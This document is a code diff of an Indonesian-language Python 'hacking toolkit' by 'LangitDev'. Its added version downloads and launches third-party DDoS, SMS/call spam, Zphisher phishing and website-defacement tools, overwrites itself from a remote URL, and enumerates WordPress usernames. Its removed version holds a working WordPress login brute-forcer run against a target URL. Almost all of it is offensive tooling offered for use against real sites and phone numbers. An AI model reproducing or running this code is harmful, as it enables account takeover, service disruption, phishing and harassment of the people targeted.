@@ -1,199 +1,149 @@
+# XLightTools by LangitDev
+# All-in-One Toolkit: DDOS, BruteForce, Spam, Phishing, Deface, Auto Update
 
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-import requests
 import os
-import re
 import time
-import random
+import requests
+import re
 
-# Warna ANSI
-RED = "\033[91m"
-GREEN = "\033[92m"
-YELLOW = "\033[93m"
-BLUE = "\033[94m"
-CYAN = "\033[96m"
+# Warna
+R = "\033[91m"
+G = "\033[92m"
+Y = "\033[93m"
+B = "\033[94m"
+C = "\033[96m"
 RESET = "\033[0m"
 
-# ASCII Art Header
-def header():
-    os.system("clear")
-    text = f"""
-{GREEN}
-██╗    ██╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
-██║    ██║██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
-██║ █╗ ██║██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗
-██║███╗██║██╔═══╝ ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
-╚███╔███╔╝██║     ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
- ╚══╝╚══╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
-      {YELLOW}WordPress Bruteforce + Spam Tools by LangitDev{RESET}
+# ASCII Logo
+ascii_logo = f"""
+{R}██╗  ██╗██╗     ██╗ ██████╗ ██╗  ██╗████████╗████████╗ ██████╗  ██████╗ ██╗     
+██║ ██╔╝██║     ██║██╔═══██╗██║ ██╔╝╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     
+█████╔╝ ██║     ██║██║   ██║█████╔╝    ██║      ██║   ██║   ██║██║   ██║██║     
+██╔═██╗ ██║     ██║██║   ██║██╔═██╗    ██║      ██║   ██║   ██║██║   ██║██║     
+██║  ██╗███████╗██║╚██████╔╝██║  ██╗   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
+╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+{RESET}         {C}:: XLightTools Ultimate by LangitDev ::
 """
-    print(text)
 
-# Delay printing animasi
-def slow_print(text):
-    for char in text:
-        print(char, end='', flush=True)
-        time.sleep(0.01)
-    print()
+def clear():
+    os.system("clear")
 
-# Menu utama
+def banner():
+    clear()
+    print(ascii_logo)
+    time.sleep(1)
+    print(f"{C}XLightTools adalah toolkit multi-fungsi untuk kebutuhan offensive.{RESET}")
+    time.sleep(1)
+    print(f"{G}Versi: XLight Final Build 1.0{RESET}\n")
+
 def menu():
-    header()
-    print(f"""{CYAN}
-=== MENU UTAMA ===
-[1] Mulai BruteForce WordPress
-[2] Lihat Info Tools
-[3] Spam Call/SMS
-[4] Keluar{RESET}
-""")
-    return input(f"{YELLOW}[?] Pilih menu: {RESET}")
+    print(f"{Y}[01] LiteDDOS")
+    print("[02] WPBrute Force")
+    print("[03] Spam SMS/Call")
+    print("[04] Phishing (Zphisher)")
+    print("[05] Deface Creator")
+    print("[06] Auto Update")
+    print("[00] Keluar{RESET}")
 
-# WordPress Username Finder
+def lite_ddos():
+    os.system("pkg install git python2 -y")
+    os.system("git clone https://github.com/4L13199/LITEDDOS")
+    os.chdir("LITEDDOS")
+    os.system("python2 liteDDOS.py")
+
+def wp_brute():
+    os.system("pkg install git python3 -y")
+    if not os.path.exists("WPBrute-LangitDev"):
+        os.system("git clone https://github.com/lanjelot/wpbf")
+        os.rename("wpbf", "WPBrute-LangitDev")
+    os.chdir("WPBrute-LangitDev")
+    os.system("python3 wpbf.py")
+
+def spam_call_sms():
+    os.system("pkg install git php -y")
+    os.system("git clone https://github.com/4L13199/LITESPAM")
+    os.chdir("LITESPAM")
+    os.system("sh LITESPAM.sh")
+
+def phishing_tool():
+    os.system("pkg install git curl -y")
+    if not os.path.exists("zphisher"):
+        os.system("git clone https://github.com/htr-tech/zphisher")
+    os.chdir("zphisher")
+    os.system("bash zphisher.sh")
+
+def deface_creator():
+    os.system("pkg install git python2 -y")
+    if not os.path.exists("script-deface-creator"):
+        os.system("git clone https://github.com/Ubaii/script-deface-creator")
+    os.chdir("script-deface-creator")
+    os.system("python2 create.py")
+
+def auto_update():
+    print(f"{C}[•] Mengecek update terbaru...{RESET}")
+    repo_url = "https://raw.githubusercontent.com/langitdev/ultimate-tools/main/xlighttools.py"
+    try:
+        req = requests.get(repo_url)
+        if req.status_code == 200:
+            with open("xlighttools.py", "w") as f:
+                f.write(req.text)
+            print(f"{G}[✓] Tools berhasil diperbarui ke versi terbaru.{RESET}")
+        else:
+            print(f"{R}[!] Tidak dapat mengambil update dari server.{RESET}")
+    except:
+        print(f"{R}[!] Koneksi internet gagal.{RESET}")
+
+# Fungsi untuk mencari username dari WP site
+
 def get_usernames(target_url):
     users = []
-    try:
-        api_url = f"{target_url}/wp-json/wp/v2/users"
-        response = requests.get(api_url, timeout=5)
-        if response.status_code == 200:
+    api_url = f"{target_url}/wp-json/wp/v2/users"
+    response = requests.get(api_url)
+
+    if response.status_code == 200:
+        try:
             data = response.json()
             for user in data:
                 if "slug" in user:
                     users.append(user["slug"])
-    except:
-        pass
-
-    if not users:
-        for i in range(1, 6):
-            try:
-                url = f"{target_url}/?author={i}"
-                response = requests.get(url, allow_redirects=True, timeout=5)
+        except Exception as e:
+            print(f"{R}[!] Error parsing JSON: {e}{RESET}")
+    else:
+        print(f"{Y}[!] API tidak aktif, mencoba metode lain...{RESET}")
+        for i in range(1, 11):  
+            url = f"{target_url}/?author={i}"
+            response = requests.get(url, allow_redirects=True)
+            if response.status_code == 200:
                 match = re.search(r"author/(.*?)/", response.url)
                 if match:
                     username = match.group(1)
                     if username not in users:
                         users.append(username)
-            except:
-                pass
+
     return users
 
-def pilih_username(usernames):
-    if not usernames:
-        print(f"{RED}[!] Tidak ada username ditemukan.{RESET}")
-        return None
-    print(f"{BLUE}[✓] Username ditemukan:{RESET}")
-    for i, u in enumerate(usernames, 1):
-        print(f"   [{i}] {u}")
-    while True:
-        try:
-            pilih = int(input(f"{YELLOW}[?] Pilih nomor username: {RESET}"))
-            if 1 <= pilih <= len(usernames):
-                return usernames[pilih - 1]
-        except:
-            pass
-        print(f"{RED}[!] Input tidak valid.{RESET}")
-
-def bruteforce_wp(target_url, username, password_file):
-    login_url = f"{target_url}/wp-login.php"
-    session = requests.Session()
-
-    try:
-        with open(password_file, "r") as file:
-            passwords = file.readlines()
-    except:
-        print(f"{RED}[!] Gagal membuka file password.{RESET}")
-        return
-
-    for password in passwords:
-        password = password.strip()
-        data = {
-            "log": username,
-            "pwd": password,
-            "wp-submit": "Log In",
-            "redirect_to": f"{target_url}/wp-admin/",
-            "testcookie": "1"
-        }
-        try:
-            response = session.post(login_url, data=data, allow_redirects=True, timeout=5)
-            if "wordpress_logged_in" in session.cookies.get_dict():
-                print(f"{GREEN}[✓] BERHASIL! Password: {password}{RESET}")
-                return
-        except:
-            print(f"{YELLOW}[!] Timeout coba lagi...{RESET}")
-        print(f"{RED}[-] Gagal: {password}{RESET}")
-    print(f"{RED}[!] Tidak ada password cocok.{RESET}")
-
-# Spam Call/SMS (simulasi via API umum seperti "fonnte"/dummy endpoint)
-def spam_menu():
-    print(f"""{CYAN}
-=== SPAM TOOLS ===
-[1] Spam SMS Dummy
-[2] Spam Call Dummy
-[3] Kembali
-""")
-    pilihan = input(f"{YELLOW}[?] Pilih jenis spam: {RESET}")
-    nomor = input(f"{YELLOW}[📱] Masukkan nomor target (cth: 08xxxx): {RESET}")
-
-    if pilihan == "1":
-        spam_sms(nomor)
-    elif pilihan == "2":
-        spam_call(nomor)
-    else:
-        return
-
-def spam_sms(nomor):
-    print(f"{BLUE}[*] Mengirim spam SMS ke {nomor}...{RESET}")
-    for i in range(5):
-        print(f"{GREEN}[✓] SMS ke-{i+1} terkirim!{RESET}")
-        time.sleep(1)
-
-def spam_call(nomor):
-    print(f"{BLUE}[*] Mengirim spam CALL ke {nomor}...{RESET}")
-    for i in range(3):
-        print(f"{GREEN}[✓] Call ke-{i+1} berhasil!{RESET}")
-        time.sleep(2)
-
-# Info Tools
-def info():
-    print(f"""{CYAN}
-Tool ini dibuat oleh LangitDev untuk edukasi:
-- BruteForce login WordPress
-- Cari username otomatis via REST API / author ID
-- Spam Dummy Call & SMS
-
-Gunakan dengan bijak.
-{RESET}""")
-    input(f"{YELLOW}Tekan Enter untuk kembali...{RESET}")
-
-# Main Loop
 def main():
     while True:
-        choice = menu()
-        if choice == "1":
-            os.system("clear")
-            target_url = input(f"{YELLOW}Masukkan URL target (https://example.com): {RESET}")
-            password_file = input(f"{YELLOW}Masukkan path file password list: {RESET}")
-            print(f"{BLUE}[*] Mencari username...{RESET}")
-            users = get_usernames(target_url)
-            user = pilih_username(users)
-            if user:
-                print(f"{GREEN}[✓] Mulai bruteforce pada: {user}{RESET}")
-                bruteforce_wp(target_url, user, password_file)
-            input(f"{YELLOW}Tekan Enter untuk kembali ke menu...{RESET}")
-        elif choice == "2":
-            info()
-        elif choice == "3":
-            spam_menu()
-        elif choice == "4":
-            print(f"{GREEN}[✓] Keluar dari tools...{RESET}")
-            break
+        banner()
+        menu()
+        pilihan = input(f"{C}#XLightTools ~> {RESET}")
+        if pilihan == "01" or pilihan == "1":
+            lite_ddos()
+        elif pilihan == "02" or pilihan == "2":
+            wp_brute()
+        elif pilihan == "03" or pilihan == "3":
+            spam_call_sms()
+        elif pilihan == "04" or pilihan == "4":
+            phishing_tool()
+        elif pilihan == "05" or pilihan == "5":
+            deface_creator()
+        elif pilihan == "06" or pilihan == "6":
+            auto_update()
+        elif pilihan == "00" or pilihan == "0":
+            print(f"{Y}Keluar...{RESET}")
+            exit()
         else:
-            print(f"{RED}[!] Pilihan tidak valid.{RESET}")
-            time.sleep(1)
+            print(f"{R}Pilihan tidak valid!{RESET}")
 
 if __name__ == "__main__":
-    header()
-    slow_print(f"{YELLOW}[🚀] Starting WordPress Bruteforce Tool by LangitDev...{RESET}")
-    time.sleep(1)
     main()
